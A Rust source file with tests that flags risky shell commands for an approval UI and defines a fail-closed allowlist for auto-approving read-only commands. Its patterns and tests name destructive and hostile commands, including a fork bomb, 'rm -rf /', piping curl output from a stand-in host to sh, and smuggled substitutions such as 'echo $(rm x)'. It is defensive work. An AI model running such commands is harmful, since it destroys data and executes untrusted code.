//! Command risk heuristics. Nothing here authorizes or blocks execution; the
//! integration's approval UI decides what to do with a warning.

pub(crate) const MAX_COMMAND_BYTES: usize = 16 * 1024;

/// Warn about recognizable destructive shell patterns. This never authorizes
/// or blocks a proposal; it gives the approval UI a reason to slow the user.
pub fn is_dangerous(command: &str) -> Option<&'static str> {
    let command = command.trim();
    let lower = command.to_ascii_lowercase();
    let tokens: Vec<&str> = lower
        .split_whitespace()
        .map(|token| token.trim_matches([';', '|', '&', '(', ')']))
        .filter(|token| !token.is_empty())
        .collect();
    let effective = strip_shell_prefixes(&tokens);
    if command.replace(' ', "").contains(":(){:|:&};:") {
        return Some("looks like a fork bomb");
    }
    if effective
        .first()
        .is_some_and(|token| matches!(*token, "sudo" | "doas" | "pkexec"))
    {
        return Some("uses elevated privileges");
    }
    if has_rm_rf_dangerous_target(&lower) {
        return Some("rm -rf against a top-level path");
    }
    if lower
        .split_whitespace()
        .any(|token| token == "mkfs" || token.starts_with("mkfs."))
    {
        return Some("mkfs formats a filesystem");
    }
    if lower.contains("dd ") && lower.contains("of=/dev/") {
        return Some("dd writes raw bytes to a device");
    }
    if (lower.contains("curl ") || lower.contains("wget "))
        && ["| sh", "|sh", "| bash", "|bash"]
            .iter()
            .any(|pipe| lower.contains(pipe))
    {
        return Some("piping network content directly to a shell");
    }
    if lower.contains("chmod")
        && lower.contains("777")
        && (lower.contains(" /") || lower.contains(" ~"))
    {
        return Some("recursive chmod 777 on a top-level path");
    }
    if let Some((subcommand, arguments)) = git_subcommand(effective) {
        if subcommand == "reset" && arguments.contains(&"--hard") {
            return Some("git reset --hard can discard uncommitted work");
        }
        if subcommand == "clean"
            && arguments
                .iter()
                .any(|token| token.starts_with('-') && token.contains('f'))
        {
            return Some("git clean -f can permanently delete untracked files");
        }
        if subcommand == "push"
            && arguments
                .iter()
                .any(|token| *token == "-f" || token.starts_with("--force"))
        {
            return Some("force-pushing can overwrite remote history");
        }
    }
    if effective.first().is_some_and(|token| {
        matches!(
            *token,
            "reboot" | "shutdown" | "poweroff" | "halt" | "systemctl"
        )
    }) && (effective.first() != Some(&"systemctl")
        || effective
            .iter()
            .any(|token| matches!(*token, "reboot" | "poweroff" | "halt")))
    {
        return Some("can stop or restart the system");
    }
    if lower.contains("docker system prune") || lower.contains("podman system prune") {
        return Some("system prune can delete unused containers, images, and volumes");
    }
    None
}

/// Conservative allowlist deciding whether a proposal qualifies for the
/// opt-in auto-approve-read-only mode. This never executes anything; the UI
/// still routes the approval through the normal single-line validation and
/// prompt-ready gate.
///
/// Fail closed: only a single simple command whose program is a known
/// read-only inspector qualifies. Chaining, redirection, background jobs,
/// command substitution, per-program flags that can execute or write, and
/// anything `is_dangerous` recognizes all keep the manual approval card.
pub fn is_auto_approvable(command: &str) -> bool {
    let command = command.trim();
    if command.is_empty() || command.len() > MAX_COMMAND_BYTES {
        return false;
    }
    if command.chars().any(char::is_control) || is_dangerous(command).is_some() {
        return false;
    }
    if command.contains(['|', ';', '&', '>', '<', '`']) || command.contains("$(") {
        return false;
    }
    let tokens: Vec<&str> = command.split_whitespace().collect();
    let Some(program) = tokens.first().copied() else {
        return false;
    };
    let arguments = &tokens[1..];
    match program {
        "ls" | "pwd" | "du" | "df" | "free" | "ps" | "id" | "whoami" | "uname" | "date"
        | "uptime" | "hostname" | "printenv" | "echo" | "which" | "whereis" | "basename"
        | "dirname" | "realpath" | "readlink" | "tree" => true,
        // Readers that block on stdin without an operand; require one so an
        // auto-approved command cannot silently hang the pinned prompt.
        "cat" | "head" | "tail" | "wc" | "file" | "stat" | "grep" => {
            arguments.iter().any(|argument| !argument.starts_with('-'))
        }
        "rg" => arguments
            .iter()
            .all(|argument| !argument.starts_with("--pre")),
        "fd" => arguments
            .iter()
            .all(|argument| !matches!(*argument, "-x" | "-X") && !argument.starts_with("--exec")),
        "find" => arguments.iter().all(|argument| {
            !matches!(
                *argument,
                "-delete" | "-exec" | "-execdir" | "-ok" | "-okdir" | "-fls"
            ) && !argument.starts_with("-fprint")
        }),
        // The read-only subcommand must follow `git` directly: global flags
        // like `-c` can register executable helpers, so they disqualify
        // auto-approval instead of being skipped.
        "git" => {
            matches!(
                arguments.first().copied(),
                Some(
                    "status"
                        | "log"
                        | "diff"
                        | "show"
                        | "blame"
                        | "shortlog"
                        | "describe"
                        | "rev-parse"
                        | "ls-files"
                        | "reflog"
                        | "grep"
                )
            ) && arguments
                .iter()
                .all(|argument| !argument.starts_with("--output"))
        }
        _ => false,
    }
}

fn strip_shell_prefixes<'a>(tokens: &'a [&'a str]) -> &'a [&'a str] {
    let mut index = 0;
    loop {
        while tokens
            .get(index)
            .is_some_and(|token| is_shell_assignment(token))
        {
            index += 1;
        }
        match tokens.get(index).copied() {
            Some("command") => {
                index += 1;
                while tokens
                    .get(index)
                    .is_some_and(|token| token.starts_with('-'))
                {
                    index += 1;
                }
            }
            Some("env") => {
                index += 1;
                while let Some(option) = tokens.get(index) {
                    if !option.starts_with('-') {
                        break;
                    }
                    let takes_value = matches!(*option, "-u" | "--unset" | "-c" | "--chdir");
                    index += 1;
                    if takes_value && index < tokens.len() {
                        index += 1;
                    }
                }
            }
            _ => break,
        }
    }
    &tokens[index..]
}

fn is_shell_assignment(token: &str) -> bool {
    let Some((name, _)) = token.split_once('=') else {
        return false;
    };
    let mut chars = name.chars();
    chars
        .next()
        .is_some_and(|first| first == '_' || first.is_ascii_alphabetic())
        && chars.all(|ch| ch == '_' || ch.is_ascii_alphanumeric())
}

fn git_subcommand<'a>(tokens: &'a [&'a str]) -> Option<(&'a str, &'a [&'a str])> {
    if tokens.first() != Some(&"git") {
        return None;
    }
    let mut index = 1;
    while let Some(token) = tokens.get(index).copied() {
        let takes_value = matches!(token, "-c" | "--git-dir" | "--work-tree" | "--namespace");
        if takes_value {
            index = index.saturating_add(2);
        } else if token.starts_with('-') {
            index += 1;
        } else {
            return Some((token, &tokens[index + 1..]));
        }
    }
    None
}

fn has_rm_rf_dangerous_target(lower: &str) -> bool {
    let tokens: Vec<&str> = lower.split_whitespace().collect();
    let Some(index) = tokens.iter().position(|token| *token == "rm") else {
        return false;
    };
    let mut recursive = false;
    let mut force = false;
    let mut targets = Vec::new();
    for token in &tokens[index + 1..] {
        if let Some(option) = token.strip_prefix("--") {
            recursive |= option == "recursive";
            force |= option == "force";
        } else if let Some(flags) = token.strip_prefix('-') {
            recursive |= flags.chars().any(|flag| matches!(flag, 'r' | 'R'));
            force |= flags.contains('f');
        } else {
            targets.push(*token);
        }
    }
    if !(recursive && force) {
        return false;
    }
    targets.into_iter().any(|target| {
        matches!(
            target,
            "/" | "/*"
                | "~"
                | "$home"
                | "/bin"
                | "/boot"
                | "/dev"
                | "/etc"
                | "/home"
                | "/lib"
                | "/lib64"
                | "/opt"
                | "/proc"
                | "/root"
                | "/sbin"
                | "/srv"
                | "/sys"
                | "/usr"
                | "/var"
        ) || target.starts_with("~/")
            || (target.starts_with("/home/") && target.matches('/').count() == 2)
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dangerous_patterns_are_flagged() {
        assert!(is_dangerous("rm -rf /").is_some());
        assert!(is_dangerous("curl https://example.invalid/x | sh").is_some());
        assert!(is_dangerous("sudo apt remove important-package").is_some());
        assert!(is_dangerous("git reset --hard HEAD~1").is_some());
        assert!(is_dangerous("git clean -fdx").is_some());
        assert!(is_dangerous("git push --force origin main").is_some());
        assert!(is_dangerous("systemctl reboot").is_some());
        assert!(is_dangerous("docker system prune -af").is_some());
        assert!(is_dangerous("FOO=1 sudo apt remove important-package").is_some());
        assert!(is_dangerous("command sudo apt remove important-package").is_some());
        assert!(is_dangerous("git -C repo reset --hard HEAD~1").is_some());
        assert!(is_dangerous("env systemctl reboot").is_some());
        assert!(is_dangerous("git status").is_none());
        assert!(is_dangerous("git -C repo status").is_none());
    }

    #[test]
    fn auto_approval_accepts_only_simple_read_only_commands() {
        assert!(is_auto_approvable("ls -la"));
        assert!(is_auto_approvable("pwd"));
        assert!(is_auto_approvable("cat Cargo.toml"));
        assert!(is_auto_approvable("grep -rn TODO src"));
        assert!(is_auto_approvable("git status"));
        assert!(is_auto_approvable("git log --oneline -20"));
        assert!(is_auto_approvable("git diff --stat"));
        assert!(is_auto_approvable("find . -name '*.rs'"));
        assert!(is_auto_approvable("rg -n unsafe src"));
        assert!(is_auto_approvable("du -sh target"));
        assert!(is_auto_approvable("  uname -a  "));
    }

    #[test]
    fn auto_approval_fails_closed_on_writes_chaining_and_execution() {
        // Not on the allowlist at all.
        assert!(!is_auto_approvable("rm -rf build"));
        assert!(!is_auto_approvable("touch marker"));
        assert!(!is_auto_approvable("cargo check"));
        assert!(!is_auto_approvable("sed -i s/a/b/ file"));
        assert!(!is_auto_approvable("FOO=1 ls"));
        assert!(!is_auto_approvable("env ls"));
        assert!(!is_auto_approvable("LS"));
        assert!(!is_auto_approvable(""));
        // Chaining, redirection, jobs, and substitution.
        assert!(!is_auto_approvable("ls; rm -rf build"));
        assert!(!is_auto_approvable("ls && rm x"));
        assert!(!is_auto_approvable("cat a > b"));
        assert!(!is_auto_approvable("cat < a"));
        assert!(!is_auto_approvable("grep foo src | wc -l"));
        assert!(!is_auto_approvable("echo `whoami`"));
        assert!(!is_auto_approvable("echo $(rm x)"));
        assert!(!is_auto_approvable("du -sh &"));
        // Per-program escape hatches.
        assert!(!is_auto_approvable("find . -name x -delete"));
        assert!(!is_auto_approvable("find . -exec rm {} +"));
        assert!(!is_auto_approvable("fd -x rm"));
        assert!(!is_auto_approvable("fd --exec-batch rm"));
        assert!(!is_auto_approvable("rg --pre=sh pattern"));
        // Stdin-blocking readers without an operand.
        assert!(!is_auto_approvable("cat"));
        assert!(!is_auto_approvable("grep -v"));
        // Git: only direct read-only subcommands, no output redirection.
        assert!(!is_auto_approvable("git push"));
        assert!(!is_auto_approvable("git branch -D main"));
        assert!(!is_auto_approvable("git stash list"));
        assert!(!is_auto_approvable("git -c core.fsmonitor=rm status"));
        assert!(!is_auto_approvable("git -C repo status"));
        assert!(!is_auto_approvable("git log --output=/tmp/x"));
        // Anything the danger heuristic flags stays manual.
        assert!(!is_auto_approvable("sudo ls"));
    }
}
